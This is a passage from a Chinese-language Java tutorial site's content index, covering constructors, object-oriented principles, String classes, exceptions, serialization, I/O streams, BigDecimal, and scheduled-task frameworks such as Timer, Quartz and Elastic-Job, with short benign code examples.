就不会再添加默认的无参数的构造方法了，这时候，就不能直接 new 一个对象而不传递参数了，所以我们一直在不知不觉地使用构造方法，这也是为什么我们在创建对象的时候后面要加一个括号（因为要调用无参的构造方法）。如果我们重载了有参的构造方法，记得都要把无参的构造方法也写出来（无论是否用到），因为这可以帮助我们在创建对象的时候少踩坑。\n构造方法有哪些特点？是否可被 override?    特点：\n 名字与类名相同。 没有返回值，但不能用 void 声明构造函数。 生成类的对象时自动执行，无需调用。  构造方法不能被 override（重写）,但是可以 overload（重载）,所以你可以看到一个类中有多个构造函数的情况。\n面向对象三大特征    封装    封装是指把一个对象的状态信息（也就是属性）隐藏在对象内部，不允许外部对象直接访问对象的内部信息。但是可以提供一些可以被外界访问的方法来操作属性。就好像我们看不到挂在墙上的空调的内部的零件信息（也就是属性），但是可以通过遥控器（方法）来控制空调。如果属性不想被外界访问，我们大可不必提供方法给外界访问。但是如果一个类没有提供给外界访问的方法，那么这个类也没有什么意义了。就好像如果没有空调遥控器，那么我们就无法操控空凋制冷，空调本身就没有意义了（当然现在还有很多其他方法 ，这里只是为了举例子）。\npublic class Student { private int id;//id属性私有化  private String name;//name属性私有化  //获取id的方法  public int getId() { return id; } //设置id的方法  public void setId(int id) { this.id = id; } //获取name的方法  public String getName() { return name; } //设置name的方法  public void setName(String name) { this.name = name; } } 继承    不同类型的对象，相互之间经常有一定数量的共同点。例如，小明同学、小红同学、小李同学，都共享学生的特性（班级、学号等）。同时，每一个对象还定义了额外的特性使得他们与众不同。例如小明的数学比较好，小红的性格惹人喜爱；小李的力气比较大。继承是使用已存在的类的定义作为基础建立新类的技术，新类的定义可以增加新的数据或新的功能，也可以用父类的功能，但不能选择性地继承父类。通过使用继承，可以快速地创建新的类，可以提高代码的重用，程序的可维护性，节省大量创建新类的时间 ，提高我们的开发效率。\n关于继承如下 3 点请记住：\n 子类拥有父类对象所有的属性和方法（包括私有属性和私有方法），但是父类中的私有属性和方法子类是无法访问，只是拥有。 子类可以拥有自己属性和方法，即子类可以对父类进行扩展。 子类可以用自己的方式实现父类的方法。（以后介绍）。  多态    多态，顾名思义，表示一个对象具有多种的状态。具体表现为父类的引用指向子类的实例。\n多态的特点:\n 对象类型和引用类型之间具有继承（类）/实现（接口）的关系； 引用类型变量发出的方法调用的到底是哪个类中的方法，必须在程序运行期间才能确定； 多态不能调用“只在子类存在但在父类不存在”的方法； 如果子类重写了父类的方法，真正执行的是子类覆盖的方法，如果子类没有覆盖父类的方法，执行的是父类的方法。  String StringBuffer 和 StringBuilder 的区别是什么? String 为什么是不可变的?    可变性\n简单的来说：String 类中使用 final 关键字修饰字符数组来保存字符串，private final char value[]，所以String 对象是不可变的。\n 补充（来自issue 675）：在 Java 9 之后，String 、StringBuilder 与 StringBuffer 的实现改用 byte 数组存储字符串 private final byte[] value\n 而 StringBuilder 与 StringBuffer 都继承自 AbstractStringBuilder 类，在 AbstractStringBuilder 中也是使用字符数组保存字符串char[]value 但是没有用 final 关键字修饰，所以这两种对象都是可变的。\nStringBuilder 与 StringBuffer 的构造方法都是调用父类构造方法也就是AbstractStringBuilder 实现的，大家可以自行查阅源码。\nAbstractStringBuilder.java\nabstract class AbstractStringBuilder implements Appendable, CharSequence { /** * The value is used for character storage. */ char[] value; /** * The count is the number of characters used. */ int count; AbstractStringBuilder(int capacity) { value = new char[capacity]; }} 线程安全性\nString 中的对象是不可变的，也就可以理解为常量，线程安全。AbstractStringBuilder 是 StringBuilder 与 StringBuffer 的公共父类，定义了一些字符串的基本操作，如 expandCapacity、append、insert、indexOf 等公共方法。StringBuffer 对方法加了同步锁或者对调用的方法加了同步锁，所以是线程安全的。StringBuilder 并没有对方法进行加同步锁，所以是非线程安全的。\n性能\n每次对 String 类型进行改变的时候，都会生成一个新的 String 对象，然后将指针指向新的 String 对象。StringBuffer 每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象并改变对象引用。相同情况下使用 StringBuilder 相比使用 StringBuffer 仅能获得 10%~15% 左右的性能提升，但却要冒多线程不安全的风险。\n对于三者使用的总结：\n 操作少量的数据: 适用 String 单线程操作字符串缓冲区下操作大量数据: 适用 StringBuilder 多线程操作字符串缓冲区下操作大量数据: 适用 StringBuffer  Object 类的常见方法总结    Object 类是一个特殊的类，是所有类的父类。它主要提供了以下 11 个方法：\npublic final native Class\u0026lt;?\u0026gt; getClass()//native方法，用于返回当前运行时对象的Class对象，使用了final关键字修饰，故不允许子类重写。  public native int hashCode() //native方法，用于返回对象的哈希码，主要使用在哈希表中，比如JDK中的HashMap。 public boolean equals(Object obj)//用于比较2个对象的内存地址是否相等，String类对该方法进行了重写用户比较字符串的值是否相等。  protected native Object clone() throws CloneNotSupportedException//naitive方法，用于创建并返回当前对象的一份拷贝。一般情况下，对于任何对象 x，表达式 x.clone() != x 为true，x.clone().getClass() == x.getClass() 为true。Object本身没有实现Cloneable接口，所以不重写clone方法并且进行调用的话会发生CloneNotSupportedException异常。  public String toString()//返回类的名字@实例的哈希码的16进制的字符串。建议Object所有的子类都重写这个方法。  public final native void notify()//native方法，并且不能重写。唤醒一个在此对象监视器上等待的线程(监视器相当于就是锁的概念)。如果有多个线程在等待只会任意唤醒一个。  public final native void notifyAll()//native方法，并且不能重写。跟notify一样，唯一的区别就是会唤醒在此对象监视器上等待的所有线程，而不是一个线程。  public final native void wait(long timeout) throws InterruptedException//native方法，并且不能重写。暂停线程的执行。注意：sleep方法没有释放锁，而wait方法释放了锁 。timeout是等待时间。  public final void wait(long timeout, int nanos) throws InterruptedException//多了nanos参数，这个参数表示额外时间（以毫微秒为单位，范围是 0-999999）。 所以超时的时间还需要加上nanos毫秒。  public final void wait() throws InterruptedException//跟之前的2个wait方法一样，只不过该方法一直等待，没有超时时间这个概念  protected void finalize() throws Throwable { }//实例被垃圾回收器回收的时候触发的操作 反射    何为反射？    如果说大家研究过框架的底层原理或者咱们自己写过框架的话，一定对反射这个概念不陌生。\n反射之所以被称为框架的灵魂，主要是因为它赋予了我们在运行时分析类以及执行类中方法的能力。\n通过反射你可以获取任意一个类的所有属性和方法，你还可以调用这些方法和属性。\n反射机制优缺点     优点 ： 可以让咱们的代码更加灵活、为各种框架提供开箱即用的功能提供了便利 缺点 ：让我们在运行时有了分析操作类的能力，这同样也增加了安全问题。比如可以无视泛型参数的安全检查（泛型参数的安全检查发生在编译时）。另外，反射的性能也要稍差点，不过，对于框架来说实际是影响不大的。Java Reflection: Why is it so slow?  反射的应用场景    像咱们平时大部分时候都是在写业务代码，很少会接触到直接使用反射机制的场景。\n但是，这并不代表反射没有用。相反，正是因为反射，你才能这么轻松地使用各种框架。像 Spring/Spring Boot、MyBatis 等等框架中都大量使用了反射机制。\n这些框架中也大量使用了动态代理，而动态代理的实现也依赖反射。\n比如下面是通过 JDK 实现动态代理的示例代码，其中就使用了反射类 Method 来调用指定的方法。\npublic class DebugInvocationHandler implements InvocationHandler { /** * 代理类中的真实对象 */ private final Object target; public DebugInvocationHandler(Object target) { this.target = target; } public Object invoke(Object proxy, Method method, Object[] args) throws InvocationTargetException, IllegalAccessException { System.out.println(\u0026#34;before method \u0026#34; + method.getName()); Object result = method.invoke(target, args); System.out.println(\u0026#34;after method \u0026#34; + method.getName()); return result; } } 另外，像 Java 中的一大利器 注解 的实现也用到了反射。\n为什么你使用 Spring 的时候 ，一个@Component注解就声明了一个类为 Spring Bean 呢？为什么你通过一个 @Value注解就读取到配置文件中的值呢？究竟是怎么起作用的呢？\n这些都是因为你可以基于反射分析类，然后获取到类/属性/方法/方法的参数上的注解。你获取到注解之后，就可以做进一步的处理。\n异常    Java 异常类层次结构图    图片来自：https://simplesnippets.tech/exception-handling-in-java-part-1/\n图片来自：https://chercher.tech/java-programming/exceptions-java\n在 Java 中，所有的异常都有一个共同的祖先 java.lang 包中的 Throwable 类。Throwable 类有两个重要的子类 Exception（异常）和 Error（错误）。Exception 能被程序本身处理(try-catch)， Error 是无法处理的(只能尽量避免)。\nException 和 Error 二者都是 Java 异常处理的重要子类，各自都包含大量子类。\n Exception :程序本身可以处理的异常，可以通过 catch 来进行捕获。Exception 又可以分为 受检查异常(必须处理) 和 不受检查异常(可以不处理)。 Error ：Error 属于程序无法处理的错误 ，我们没办法通过 catch 来进行捕获 。例如，Java 虚拟机运行错误（Virtual MachineError）、虚拟机内存不够错误(OutOfMemoryError)、类定义错误（NoClassDefFoundError）等 。这些异常发生时，Java 虚拟机（JVM）一般会选择线程终止。  受检查异常\nJava 代码在编译过程中，如果受检查异常没有被 catch/throw 处理的话，就没办法通过编译 。比如下面这段 IO 操作的代码。\n除了RuntimeException及其子类以外，其他的Exception类及其子类都属于受检查异常 。常见的受检查异常有： IO 相关的异常、ClassNotFoundException 、SQLException\u0026hellip;。\n不受检查异常\nJava 代码在编译过程中 ，我们即使不处理不受检查异常也可以正常通过编译。\nRuntimeException 及其子类都统称为非受检查异常，例如：NullPointerException、NumberFormatException（字符串转换为数字）、ArrayIndexOutOfBoundsException（数组越界）、ClassCastException（类型转换错误）、ArithmeticException（算术错误）等。\nThrowable 类常用方法     public String getMessage():返回异常发生时的简要描述 public String toString():返回异常发生时的详细信息 public String getLocalizedMessage():返回异常对象的本地化信息。使用 Throwable 的子类覆盖这个方法，可以生成本地化信息。如果子类没有覆盖该方法，则该方法返回的信息与 getMessage()返回的结果相同 public void printStackTrace():在控制台上打印 Throwable 对象封装的异常信息  try-catch-finally     try块： 用于捕获异常。其后可接零个或多个 catch 块，如果没有 catch 块，则必须跟一个 finally 块。 catch块： 用于处理 try 捕获到的异常。 finally 块： 无论是否捕获或处理异常，finally 块里的语句都会被执行。当在 try 块或 catch 块中遇到 return 语句时，finally 语句块将在方法返回之前被执行。  在以下 3 种特殊情况下，finally 块不会被执行：\n 在 try 或 finally块中用了 System.exit(int)退出程序。但是，如果 System.exit(int) 在异常语句之后，finally 还是会被执行 程序所在的线程死亡。 关闭 CPU。  下面这部分内容来自 issue:https://github.com/Snailclimb/JavaGuide/issues/190。\n注意： 当 try 语句和 finally 语句中都有 return 语句时，在方法返回之前，finally 语句的内容将被执行，并且 finally 语句的返回值将会覆盖原始的返回值。如下：\npublic class Test { public static int f(int value) { try { return value * value; } finally { if (value == 2) { return 0; } } } } 如果调用 f(2)，返回值将是 0，因为 finally 语句的返回值覆盖了 try 语句块的返回值。\n使用 try-with-resources 来代替try-catch-finally     适用范围（资源的定义）： 任何实现 java.lang.AutoCloseable或者 java.io.Closeable 的对象 关闭资源和 finally 块的执行顺序： 在 try-with-resources 语句中，任何 catch 或 finally 块在声明的资源关闭后运行  《Effecitve Java》中明确指出：\n 面对必须要关闭的资源，我们总是应该优先使用 try-with-resources 而不是try-finally。随之产生的代码更简短，更清晰，产生的异常对我们也更有用。try-with-resources语句让我们更容易编写必须要关闭的资源的代码，若采用try-finally则几乎做不到这点。\n Java 中类似于InputStream、OutputStream 、Scanner 、PrintWriter等的资源都需要我们调用close()方法来手动关闭，一般情况下我们都是通过try-catch-finally语句来实现这个需求，如下：\n//读取文本文件的内容  Scanner scanner = null; try { scanner = new Scanner(new File(\u0026#34;D://read.txt\u0026#34;)); while (scanner.hasNext()) { System.out.println(scanner.nextLine()); } } catch (FileNotFoundException e) { e.printStackTrace(); } finally { if (scanner != null) { scanner.close(); } } 使用 Java 7 之后的 try-with-resources 语句改造上面的代码:\ntry (Scanner scanner = new Scanner(new File(\u0026#34;test.txt\u0026#34;))) { while (scanner.hasNext()) { System.out.println(scanner.nextLine()); } } catch (FileNotFoundException fnfe) { fnfe.printStackTrace(); } 当然多个资源需要关闭的时候，使用 try-with-resources 实现起来也非常简单，如果你还是用try-catch-finally可能会带来很多问题。\n通过使用分号分隔，可以在try-with-resources块中声明多个资源。\ntry (BufferedInputStream bin = new BufferedInputStream(new FileInputStream(new File(\u0026#34;test.txt\u0026#34;))); BufferedOutputStream bout = new BufferedOutputStream(new FileOutputStream(new File(\u0026#34;out.txt\u0026#34;)))) { int b; while ((b = bin.read()) != -1) { bout.write(b); } } catch (IOException e) { e.printStackTrace(); } I/O 流    什么是序列化?什么是反序列化?    如果我们需要持久化 Java 对象比如将 Java 对象保存在文件中，或者在网络传输 Java 对象，这些场景都需要用到序列化。\n简单来说：\n 序列化： 将数据结构或对象转换成二进制字节流的过程 反序列化：将在序列化过程中所生成的二进制字节流转换成数据结构或者对象的过程  对于 Java 这种面向对象编程语言来说，我们序列化的都是对象（Object）也就是实例化后的类(Class)，但是在 C++这种半面向对象的语言中，struct(结构体)定义的是数据结构类型，而 class 对应的是对象类型。\n维基百科是如是介绍序列化的：\n 序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。对于许多对象，像是使用大量引用的复杂对象，这种序列化重建的过程并不容易。面向对象中的对象序列化，并不概括之前原始对象所关系的函数。这种过程也称为对象编组（marshalling）。从一系列字节提取数据结构的反向操作，是反序列化（也称为解编组、deserialization、unmarshalling）。\n 综上：序列化的主要目的是通过网络传输对象或者说是将对象存储到文件系统、数据库、内存中。\nhttps://www.corejavaguru.com/java/serialization/interview-questions-1\nJava 序列化中如果有些字段不想进行序列化，怎么办？    对于不想进行序列化的变量，使用 transient 关键字修饰。\ntransient 关键字的作用是：阻止实例中那些用此关键字修饰的的变量序列化；当对象被反序列化时，被 transient 修饰的变量值不会被持久化和恢复。\n关于 transient 还有几点注意：\n transient 只能修饰变量，不能修饰类和方法。 transient 修饰的变量，在反序列化后变量值将会被置成类型的默认值。例如，如果是修饰 int 类型，那么反序列后结果就是 0。 static 变量因为不属于任何对象(Object)，所以无论有没有 transient 关键字修饰，均不会被序列化。  获取用键盘输入常用的两种方法    方法 1：通过 Scanner\nScanner input = new Scanner(System.in); String s = input.nextLine(); input.close(); 方法 2：通过 BufferedReader\nBufferedReader input = new BufferedReader(new InputStreamReader(System.in)); String s = input.readLine(); Java 中 IO 流分为几种?     按照流的流向分，可以分为输入流和输出流； 按照操作单元划分，可以划分为字节流和字符流； 按照流的角色划分为节点流和处理流。  Java IO 流共涉及 40 多个类，这些类看上去很杂乱，但实际上很有规则，而且彼此之间存在非常紧密的联系， Java IO 流的 40 多个类都是从如下 4 个抽象类基类中派生出来的。\n InputStream/Reader: 所有的输入流的基类，前者是字节输入流，后者是字符输入流。 OutputStream/Writer: 所有输出流的基类，前者是字节输出流，后者是字符输出流。  按操作方式分类结构图：\n按操作对象分类结构图：\n既然有了字节流,为什么还要有字符流?    问题本质想问：不管是文件读写还是网络发送接收，信息的最小存储单元都是字节，那为什么 I/O 流操作要分为字节流操作和字符流操作呢？\n回答：字符流是由 Java 虚拟机将字节转换得到的，问题就出在这个过程还算是非常耗时，并且，如果我们不知道编码类型就很容易出现乱码问题。所以， I/O 流就干脆提供了一个直接操作字符的接口，方便我们平时对字符进行流操作。如果音频文件、图片等媒体文件用字节流比较好，如果涉及到字符的话使用字符流比较好。\n4. 参考     https://stackoverflow.com/questions/1906445/what-is-the-difference-between-jdk-and-jre https://www.educba.com/oracle-vs-openjdk/ https://stackoverflow.com/questions/22358071/differences-between-oracle-jdk-and-openjdk 基础概念与常识  "},{"id":225,"href":"/java/basis/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%96%91%E9%9A%BE%E7%82%B9/","title":"Java基础知识疑难点","parent":"basis","content":"正确使用 equals 方法    Object的equals方法容易抛空指针异常，应使用常量或确定有值的对象来调用 equals。\n举个例子：\n// 不能使用一个值为null的引用类型变量来调用非静态方法，否则会抛出异常 String str = null; if (str.equals(\u0026#34;SnailClimb\u0026#34;)) { ... } else { .. } 运行上面的程序会抛出空指针异常，但是我们把第二行的条件判断语句改为下面这样的话，就不会抛出空指针异常，else 语句块得到执行。：\n\u0026#34;SnailClimb\u0026#34;.equals(str);// false 不过更推荐使用 java.util.Objects#equals(JDK7 引入的工具类)。\nObjects.equals(null,\u0026#34;SnailClimb\u0026#34;);// false 我们看一下java.util.Objects#equals的源码就知道原因了。\npublic static boolean equals(Object a, Object b) { // 可以避免空指针异常。如果a=null的话此时a.equals(b)就不会得到执行，避免出现空指针异常。  return (a == b) || (a != null \u0026amp;\u0026amp; a.equals(b)); } 注意：\nReference:Java中equals方法造成空指针异常的原因及解决方案\n 每种原始类型都有默认值一样，如int默认值为 0，boolean 的默认值为 false，null 是任何引用类型的默认值，不严格的说是所有 Object 类型的默认值。 可以使用 == 或者 != 操作来比较null值，但是不能使用其他算法或者逻辑操作。在Java中null == null将返回true。 不能使用一个值为null的引用类型变量来调用非静态方法，否则会抛出异常  整型包装类值的比较    所有整型包装类对象值的比较必须使用equals方法。\n先看下面这个例子：\nInteger i1 = 40; Integer i2 = new Integer(40); System.out.println(i1==i2);//false Integer i1=40 这一行代码会发生装箱，也就是说这行代码等价于 Integer i1=Integer.valueOf(40) 。因此，i1 直接使用的是常量池中的对象。而Integer i1 = new Integer(40) 会直接创建新的对象。因此，输出 false 。\n记住：所有整型包装类对象之间值的比较，全部使用 equals() 方法比较。\n注意： 如果你的IDE(IDEA/Eclipse)上安装了阿里巴巴的p3c插件，这个插件如果检测到你用 ==的话会报错提示，推荐安装一个这个插件，很不错。\nBigDecimal    BigDecimal 的用处    《阿里巴巴Java开发手册》中提到：浮点数之间的等值判断，基本数据类型不能用==来比较，包装数据类型不能用 equals 来判断。 具体原理和浮点数的编码方式有关，这里就不多提了，我们下面直接上实例：\nfloat a = 1.0f - 0.9f; float b = 0.9f - 0.8f; System.out.println(a);// 0.100000024 System.out.println(b);// 0.099999964 System.out.println(a == b);// false 具有基本数学知识的我们很清楚的知道输出并不是我们想要的结果（精度丢失），我们如何解决这个问题呢？一种很常用的方法是：使用 BigDecimal 来定义浮点数的值，再进行浮点数的运算操作。\nBigDecimal a = new BigDecimal(\u0026#34;1.0\u0026#34;); BigDecimal b = new BigDecimal(\u0026#34;0.9\u0026#34;); BigDecimal c = new BigDecimal(\u0026#34;0.8\u0026#34;); BigDecimal x = a.subtract(b); BigDecimal y = b.subtract(c); System.out.println(x); /* 0.1 */ System.out.println(y); /* 0.1 */ System.out.println(Objects.equals(x, y)); /* true */ BigDecimal 的大小比较    a.compareTo(b) : 返回 -1 表示 a 小于 b，0 表示 a 等于 b ， 1表示 a 大于 b。\nBigDecimal a = new BigDecimal(\u0026#34;1.0\u0026#34;); BigDecimal b = new BigDecimal(\u0026#34;0.9\u0026#34;); System.out.println(a.compareTo(b));// 1 BigDecimal 保留几位小数    通过 setScale方法设置保留几位小数以及保留规则。保留规则有挺多种，不需要记，IDEA会提示。\nBigDecimal m = new BigDecimal(\u0026#34;1.255433\u0026#34;); BigDecimal n = m.setScale(3,BigDecimal.ROUND_HALF_DOWN); System.out.println(n);// 1.255 BigDecimal 的使用注意事项    注意：我们在使用BigDecimal时，为了防止精度丢失，推荐使用它的 BigDecimal(String) 构造方法来创建对象。《阿里巴巴Java开发手册》对这部分内容也有提到如下图所示。\n总结    BigDecimal 主要用来操作（大）浮点数，BigInteger 主要用来操作大整数（超过 long 类型）。\nBigDecimal 的实现利用到了 BigInteger, 所不同的是 BigDecimal 加入了小数位的概念\n基本数据类型与包装数据类型的使用标准    Reference:《阿里巴巴Java开发手册》\n 【强制】所有的 POJO 类属性必须使用包装数据类型。 【强制】RPC 方法的返回值和参数必须使用包装数据类型。 【推荐】所有的局部变量使用基本数据类型。  比如我们如果自定义了一个Student类,其中有一个属性是成绩score,如果用Integer而不用int定义,一次考试,学生可能没考,值是null,也可能考了,但考了0分,值是0,这两个表达的状态明显不一样.\n说明 :POJO 类属性没有初值是提醒使用者在需要使用时，必须自己显式地进行赋值，任何 NPE 问题，或者入库检查，都由使用者来保证。\n正例 : 数据库的查询结果可能是 null，因为自动拆箱，用基本数据类型接收有 NPE 风险。\n反例 : 比如显示成交总额涨跌情况，即正负 x%，x 为基本数据类型，调用的 RPC 服务，调用不成功时，返回的是默认值，页面显示为 0%，这是不合理的，应该显示成中划线。所以包装数据类型的 null 值，能够表示额外的信息，如:远程调用失败，异常退出。\n"},{"id":226,"href":"/system-design/Java%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%A4%A7%E6%8F%AD%E7%A7%98/","title":"Java定时任务大揭秘","parent":"system-design","content":"为什么需要定时任务？    我们来看一下几个非常常见的业务场景：\n 某系统凌晨要进行数据备份。 某电商平台，用户下单半个小时未支付的情况下需要自动取消订单。 某媒体聚合平台，每 10 分钟动态抓取某某网站的数据为自己所用。 某博客平台，支持定时发送文章。 某基金平台，每晚定时计算用户当日收益情况并推送给用户最新的数据。 \u0026hellip;\u0026hellip;  这些场景往往都要求我们在某个特定的时间去做某个事情。\n单机定时任务技术选型    Timer    java.util.Timer是 JDK 1.3 开始就已经支持的一种定时任务的实现方式。\nTimer 内部使用一个叫做 TaskQueue 的类存放定时任务，它是一个基于最小堆实现的优先级队列。TaskQueue 会按照任务距离下一次执行时间的大小将任务排序，保证在堆顶的任务最先执行。这样在需要执行任务时，每次只需要取出堆顶的任务运行即可！\nTimer 使用起来比较简单，通过下面的方式我们就能创建一个 1s 之后执行的定时任务。\n// 示例代码： TimerTask task = new TimerTask() { public void run() { System.out.println(\u0026#34;当前时间: \u0026#34; + new Date() + \u0026#34;n\u0026#34; + \u0026#34;线程名称: \u0026#34; + Thread.currentThread().getName()); } }; System.out.println(\u0026#34;当前时间: \u0026#34; + new Date() + \u0026#34;n\u0026#34; + \u0026#34;线程名称: \u0026#34; + Thread.currentThread().getName()); Timer timer = new Timer(\u0026#34;Timer\u0026#34;); long delay = 1000L; timer.schedule(task, delay); //输出： 当前时间: Fri May 28 15:18:47 CST 2021n线程名称: main 当前时间: Fri May 28 15:18:48 CST 2021n线程名称: Timer 不过其缺陷较多，比如一个 Timer 一个线程，这就导致 Timer 的任务的执行只能串行执行，一个任务执行时间过长的话会影响其他任务（性能非常差），再比如发生异常时任务直接停止（Timer 只捕获了 InterruptedException ）。\nTimer 类上的有一段注释是这样写的：\n* This class does not offer real-time guarantees: it schedules * tasks using the \u0026lt;tt\u0026gt;Object.wait(long)\u0026lt;/tt\u0026gt; method. *Java 5.0 introduced the {@code java.util.concurrent} package and * one of the concurrency utilities therein is the {@link * java.util.concurrent.ScheduledThreadPoolExecutor * ScheduledThreadPoolExecutor} which is a thread pool for repeatedly * executing tasks at a given rate or delay. It is effectively a more * versatile replacement for the {@code Timer}/{@code TimerTask} * combination, as it allows multiple service threads, accepts various * time units, and doesn\u0026#39;t require subclassing {@code TimerTask} (just * implement {@code Runnable}). Configuring {@code * ScheduledThreadPoolExecutor} with one thread makes it equivalent to * {@code Timer}. 大概的意思就是： ScheduledThreadPoolExecutor 支持多线程执行定时任务并且功能更强大，是 Timer 的替代品。\nScheduledExecutorService    ScheduledExecutorService 是一个接口，有多个实现类，比较常用的是 ScheduledThreadPoolExecutor 。\nScheduledThreadPoolExecutor 本身就是一个线程池，支持任务并发执行。并且，其内部使用 DelayQueue 作为任务队列。\n// 示例代码： TimerTask repeatedTask = new TimerTask() { @SneakyThrows public void run() { System.out.println(\u0026#34;当前时间: \u0026#34; + new Date() + \u0026#34;n\u0026#34; + \u0026#34;线程名称: \u0026#34; + Thread.currentThread().getName()); } }; System.out.println(\u0026#34;当前时间: \u0026#34; + new Date() + \u0026#34;n\u0026#34; + \u0026#34;线程名称: \u0026#34; + Thread.currentThread().getName()); ScheduledExecutorService executor = Executors.newScheduledThreadPool(3); long delay = 1000L; long period = 1000L; executor.scheduleAtFixedRate(repeatedTask, delay, period, TimeUnit.MILLISECONDS); Thread.sleep(delay + period * 5); executor.shutdown(); //输出： 当前时间: Fri May 28 15:40:46 CST 2021n线程名称: main 当前时间: Fri May 28 15:40:47 CST 2021n线程名称: pool-1-thread-1 当前时间: Fri May 28 15:40:48 CST 2021n线程名称: pool-1-thread-1 当前时间: Fri May 28 15:40:49 CST 2021n线程名称: pool-1-thread-2 当前时间: Fri May 28 15:40:50 CST 2021n线程名称: pool-1-thread-2 当前时间: Fri May 28 15:40:51 CST 2021n线程名称: pool-1-thread-2 当前时间: Fri May 28 15:40:52 CST 2021n线程名称: pool-1-thread-2 不论是使用 Timer 还是 ScheduledExecutorService 都无法使用 Cron 表达式指定任务执行的具体时间。\nSpring Task    我们直接通过 Spring 提供的 @Scheduled 注解即可定义定时任务，非常方便！\n/** * cron：使用Cron表达式。　每分钟的1，2秒运行 */ @Scheduled(cron = \u0026#34;1-2 * * * * ? \u0026#34;) public void reportCurrentTimeWithCronExpression() { log.info(\u0026#34;Cron Expression: The time is now {}\u0026#34;, dateFormat.format(new Date())); } 我在大学那会做的一个 SSM 的企业级项目，就是用的 Spring Task 来做的定时任务。\n并且，Spring Task 还是支持 Cron 表达式 的。Cron 表达式主要用于定时作业(定时任务)系统定义执行时间或执行频率的表达式，非常厉害，你可以通过 Cron 表达式进行设置定时任务每天或者每个月什么时候执行等等操作。咱们要学习定时任务的话，Cron 表达式是一定是要重点关注的。推荐一个在线 Cron 表达式生成器：http://cron.qqe2.com/ 。\n但是，Spring 自带的定时调度只支持单机，并且提供的功能比较单一。之前写过一篇文章:《5 分钟搞懂如何在 Spring Boot 中 Schedule Tasks》 ，不了解的小伙伴可以参考一下。\nSpring Task 底层是基于 JDK 的 ScheduledThreadPoolExecutor 线程池来实现的。\n优缺点总结：\n 优点： 简单，轻量，支持 Cron 表达式 缺点 ：功能单一  时间轮    Kafka、Dubbo、ZooKeeper、Netty 、Caffeine 、Akka 中都有对时间轮的实现。\n时间轮简单来说就是一个环形的队列（底层一般基于数组实现），队列中的每一个元素（时间格）都可以存放一个定时任务列表。\n时间轮中的每个时间格代表了时间轮的基本时间跨度或者说时间精度，加入时间一秒走一个时间格的话，那么这个时间轮的最高精度就是 1 秒（也就是说 3 s 和 3.9s 会在同一个时间格中）。\n下图是一个有 12 个时间格的时间轮，转完一圈需要 12 s。当我们需要新建一个 3s 后执行的定时任务，只需要将定时任务放在下标为 3 的时间格中即可。当我们需要新建一个 9s 后执行的定时任务，只需要将定时任务放在下标为 9 的时间格中即可。\n那当我们需要创建一个 13s 后执行的定时任务怎么办呢？这个时候可以引入一叫做 圈数/轮数 的概念，也就是说这个任务还是放在下标为 3 的时间格中， 不过它的圈数为 2 。\n除了增加圈数这种方法之外，还有一种 多层次时间轮 （类似手表），Kafka 采用的就是这种方案。\n针对下图的时间轮，我来举一个例子便于大家理解。\n上图的时间轮，第 1 层的时间精度为 1 ，第 2 层的时间精度为 20 ，第 3 层的时间精度为 400。假如我们需要添加一个 350s 后执行的任务 A 的话（当前时间是 0s），这个任务会被放在第 2 层（因为第二层的时间跨度为 20*20=400\u0026gt;350）的第 350/20=17 个时间格子。\n当第一层转了 17 圈之后，时间过去了 340s ，第 2 层的指针此时来到第 17 个时间格子。此时，第 2 层第 17 个格子的任务会被移动到第 1 层。\n任务 A 当前是 10s 之后执行，因此它会被移动到第 1 层的第 10 个时间格子。\n这里在层与层之间的移动也叫做时间轮的升降级。参考手表来理解就好！\n时间轮比较适合任务数量比较多的定时任务场景，它的任务写入和执行的时间复杂度都是 0（1）。\n分布式定时任务技术选型    上面提到的一些定时任务的解决方案都是在单机下执行的，适用于比较简单的定时任务场景比如每天凌晨备份一次数据。\n如果我们需要一些高级特性比如支持任务在分布式场景下的分片和高可用的话，我们就需要用到分布式任务调度框架了。\n通常情况下，一个定时任务的执行往往涉及到下面这些角色：\n 任务 ： 首先肯定是要执行的任务，这个任务就是具体的业务逻辑比如定时发送文章。 调度器 ：其次是调度中心，调度中心主要负责任务管理，会分配任务给执行器。 执行器 ： 最后就是执行器，执行器接收调度器分派的任务并执行。  Quartz    一个很火的开源任务调度框架，完全由Java写成。Quartz 可以说是 Java 定时任务领域的老大哥或者说参考标准，其他的任务调度框架基本都是基于 Quartz 开发的，比如当当网的elastic-job就是基于quartz二次开发之后的分布式调度解决方案。\n使用 Quartz 可以很方便地与 Spring 集成，并且支持动态添加任务和集群。但是，Quartz 使用起来也比较麻烦，API 繁琐。\n并且，Quzrtz 并没有内置 UI 管理控制台，不过你可以使用 quartzui 这个开源项目来解决这个问题。\n另外，Quartz 虽然也支持分布式任务。但是，它是在数据库层面，通过数据库的锁机制做的，有非常多的弊端比如系统侵入性严重、节点负载不均衡。有点伪分布式的味道。\n优缺点总结：\n 优点： 可以与 Spring 集成，并且支持动态添加任务和集群。 缺点 ：分布式支持不友好，没有内置 UI 管理控制台、使用麻烦（相比于其他同类型框架来说）  Elastic-Job    Elastic-Job 是当当网开源的一个基于Quartz和ZooKeeper的分布式调度解决方案，由两个相互独立的子项目 Elastic-Job-Lite 和 Elastic-Job-Cloud 组成，一般我们只要使用 Elastic-Job-Lite 就好。\nElasticJob 支持任务在分布式场景下的分片和高可用、任务可视化管理等功能。\nElasticJob-Lite 的架构设计如下图所示：\n从上图可以看出，Elastic-Job 没有调度中心这一概念，而是使用 ZooKeeper 作为注册中心，注册中心负责协调分配任务到不同的节点上。\nElastic-Job 中的定时调度都是由执行器自行触发，这种设计也被称为去中心化设计（调度和处理都是执行器单独完成）。\n@Component @ElasticJobConf(name = \u0026#34;dayJob\u0026#34;, cron = \u0026#34;0/10 * * * * ?\u0026#34;, shardingTotalCount = 2, shardingItemParameters = \u0026#34;0=AAAA,1=BBBB\u0026#34;, description = \u0026#34;简单任务\u0026#34;, failover = true) public class TestJob implements SimpleJob { @Override public void execute(ShardingContext shardingContext) { log.info(\u0026#34;TestJob任务名：【{}】, 片数：【{}】, param=【{}】\u0026#34;, shardingContext.getJobName(), shardingContext.getShardingTotalCount(), shardingContext.getShardingParameter()); } } 相关地址：\n Github 